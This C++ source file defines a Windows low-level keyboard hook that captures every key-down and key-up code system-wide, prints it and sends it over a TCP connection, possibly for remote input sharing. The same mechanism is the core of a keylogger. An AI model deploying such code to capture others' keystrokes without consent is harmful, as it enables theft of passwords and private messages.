#include "../NetSockets/NetSockets.h"
#include "KeyboardListener.h"

extern TCPClient *tcpClient;

LRESULT CALLBACK KeyboardListener::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    HHOOK hkb = 0;
    if (nCode < 0)
        return CallNextHookEx(hkb, nCode, wParam, lParam);

    if (HC_ACTION == nCode)
    {
        try
        {
            if (wParam == WM_KEYDOWN)
            {
                KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
                char res[20] = {};
                snprintf(res, sizeof(res), "down%d", (int)p->vkCode);
                p = nullptr;

                std::cout << res << '\n';

                tcpClient->SendData(res, sizeof(res));
            }
            else if (wParam == WM_KEYUP)
            {
                KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
                char res[20] = {};
                snprintf(res, sizeof(res), "up%d", (int)p->vkCode);
                p = nullptr;

                std::cout << res << '\n';

                tcpClient->SendData(res, sizeof(res));
            }
        }
        catch (std::runtime_error e)
        {
            MessageBox(NULL, e.what(), "Error", MB_OK);
        }
    }
    return CallNextHookEx(hkb, nCode, wParam, lParam);
}